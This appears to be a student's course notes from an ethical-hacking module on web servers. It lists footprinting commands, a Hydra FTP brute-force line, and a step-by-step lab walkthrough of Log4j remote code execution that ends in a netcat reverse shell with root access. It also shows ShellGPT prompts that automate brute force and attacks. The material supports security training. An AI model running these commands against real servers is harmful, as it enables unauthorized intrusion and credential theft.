# Module 13

## Hacking Web Servers
A web server is hardware and software that handles client HTTP requests, delivers requested resources, or returns errors, and is often targeted by ethical hackers for testing vulnerabilities.

**Objectives**    
- Understand how a web server functions (hardware + software).
- Learn how HTTP requests and responses work.
- Identify errors and vulnerabilities in web servers.
- Explore how ethical hackers/pen testers test and secure servers.

**Approach**    
- Study the client-server communication process (HTTP requests/responses).
- Observe how servers fetch data from storage or application layers.
- Analyze error handling (e.g., missing content).
- Use ethical hacking tools and techniques to simulate attacks and identify weaknesses.

---

### 1. Footprint the Webserver
An ethical hacker or penetration tester must perform footprinting to detect the loopholes in the web server of the target organization.

#### 1.1 Information gathering using Ghost Eye
[GitHub - BullsEye0/ghost_eye](https://github.com/BullsEye0/ghost_eye)    
Ghost Eye is an Information Gathering Tool I made in python 3. To run Ghost Eye, it only needs a domain or ip. Ghost Eye can work with any Linux distros if they support Python 3.

**Create a Virtual Environment (Recommended)**
- Install venv if not installed
  - `sudo apt install python3-venv -y`
- Create virtual environment inside ghost_eye
  - `cd ~/ghost_eye`
  - `python3 -m venv venv`
- Activate it
  - `source venv/bin/activate`
-  Now install requirements
  -  `pip install -r requirements.txt`
- Downgrade urllib3
  - `pip install "urllib3<2"`
- Now Launch it
  - `python3 ghost_eye.py`

We can use the tool for WHOIS lookup, DNS etc and also scan for clickjacking vulnerability

#### 1.2 Perform Web Reconnaisance using skipfish
[skipfish | Kali Linux Tools](https://www.kali.org/tools/skipfish/)

#### 1.3 Footprint Webserver using Httprecon
[httprecon project - advanced http fingerprinting](https://www.computec.ch/projekte/httprecon/)

#### 1.4 Footprinting using ID serve
[GRC | ID Serve - Internet Server Identification Utility](https://www.grc.com/id/idserve.htm)

#### 1.5 Footprinting using netcat and Telnet
**netcat**
- `nc -vv certifiedhacker.com 443`
- `GET / HTTP/1.0`

**telnet**
- `telnet certifiedhacker.com 443`
- `GET / HTTP/1.0`

#### 1.6 Enumeration Webserver using NSE script
**Steps**:
- Scan
  - `nmap -sV --script http-enum certifiedhacker.com`
- Now to enumerate the hostnames use the following script    
  - `nmap --script hostmap-bft -script-args hostmap.bfk=hostmap- certifiedhacker.com`
- http trace scanner
  - nmap --script http-trace certifiedhacker.com
- Http WAF (Firewall) detection
  - nmap -p 80 --script http-waf-detect certifiedhacker.com

#### 1.7 Uniscan webserver footprinting
[uniscan | Kali Linux Tools](https://www.kali.org/tools/uniscan/)

---

### 2. Perform Webserver attacks
An ethical hacker or pen tester must test the company’s web server against various attacks and other vulnerabilities.

#### 2.1 Crack FTP credentials using Hydra
- Hydra -L users.txt -P passwords.txt ftp://192.168.18.2

#### 2.2 Gain Access to Target Web Server by Exploiting Log4j Vulnerability

**Install Docker**    
- `sudo apt-get update`
- `sudo apt-get install docker.io `

**Build the docker Image**    
- `docker build -t log4j-shell-poc`
> `-t`: specifies allocating a pseudo-tty.

**Start the vulnerable server**
- `docker run --network host log4j-shell-poc`

**Exploitation**    
Scan the IP    
- `nmap -sV -sC 10.10.1.9`
1. From the result we can see that port 8080 is open and Apache Tomcat/Coyote 1.1 server is running on the target system.
2. Upon investigation we can see that Apache is vulnerable to Remote Code Execution (RCE) attack. Now we wil use searchsploit to find the vulnerabilities pertaining to RCE attack on the target server.
3. In the terminal window run `searchsploit -t Apache RCE` command to view the RCE vulnerabilities on the Apache server.
4. Now, we need to select a vulnerability to exploit the Server from the list, from the Nmap scan we found that the Apache Tomcat server is running on JSP so we will target java vulnerabilities from the list of vulnerabilities.
5. We can see that Java platform is vulnerable for Apache Log4j 2 - Remote Command Execution (RCE) exploit.
6. We will now exploit Log4j vulnerability present in the target Web Server to perform Remote code execution.
7. Click the Firefox icon at the top of Desktop, to open a browser window.
8. In the address bar of the browser, type http://10.10.1.9:8080 and press Enter.
9. As we can observe that the Log4j vulnerable server is running on the Ubuntu machine, leave the Firefox and website open.
10. Switch to the Terminal window, run cd log4j-shell-poc/ and press Enter, to enter into log4j-shell-poc directory.
11. Now, we needed to install JDK 8, to do that open a new terminal window and type sudo su and press Enter to run the programs as a root user.
> In the [sudo] password for attacker field, type toor as a password and press Enter.
12. We need to extract JDK zip file which is already placed at /home/attacker location.
13. Type tar -xf jdk-8u202-linux-x64.tar.gz and press Enter, to extract the file.
> -xf: specifies extract all files.
14. Now we will move the jdk1.8.0_202 into /usr/bin/. To do that, type mv jdk1.8.0_202 /usr/bin/ and press Enter.
15. Now, we need to update the installed JDK path in the poc.py file.
16. Navigate to the previous terminal window. In the terminal, type pluma poc.py and press Enter to open poc.py file.
17. In the poc.py file scroll down and in line 62, replace jdk1.8.0_20/bin/javac with /usr/bin/jdk1.8.0_202/bin/javac.
18. Scroll down to line 87 and replace jdk1.8.0_20/bin/java with /usr/bin/jdk1.8.0_202/bin/java.
19. Scroll down to line 99 and replace jdk1.8.0_20/bin/java with /usr/bin/jdk1.8.0_202/bin/java.
20. After making all the changes save the changes and close the poc.py editor window.
21. Now, open a new terminal window and type nc -lvp 9001 and press Enter, to initiate a netcat listener as shown in screenshot.
22. Switch to previous terminal window and type python3 poc.py --userip 10.10.1.13 --webport 8000 --lport 9001 and press Enter, to start the exploitation and create payload.
23. Now, copy the payload generated in the send me: section.
24. Switch to Firefox browser window, in Username field paste the payload that was copied in previous step and in Password field type password and press Login button as shown in the screenshot.
> In the Password field you can enter any password.
25. Now switch to the netcat listener, you can see that a reverse shell is opened.
26. In the listener window type pwd and press Enter, to view the present working directory.
27. Now, type whoami and press Enter.
28. We can see that we have shell access to the target web application as a root user.
29. The Log4j vulnerability takes the payload as input and processes it, as a result we will obtain a reverse shell.

---

### 3. Perform a Web Server Hacking using AI
AI-powered tools and techniques provide ethical hackers with enhanced capabilities to discover vulnerabilities, automate attacks, and strengthen defenses.

#### 3.1 Perform Web Server Footprinting and Attacks using ShellGPT
**Steps**:
**Directory traversal**
- `sgpt --shell “Perform a directory traversal on target url https://certifiedhacker.com using gobuster”`
- 
**FTP Brute force**
- `sgpt --shell "Attempt FTP login on target IP 10.10.1.11 with hydra using usernames and passwords file from /home/attacker/Wordlists"`
- 
**Webserver Footprinting**
- `sgpt --shell "Perform webserver footprinting on target IP 10.10.1.22"`
- `sgpt --shell “Perform webserver footprinting on target IP 10.10.1.22 with netcat`

**Mirror a Website**
- `sgpt --shell “Mirror the target website certifiedhacker.com”`

---
---
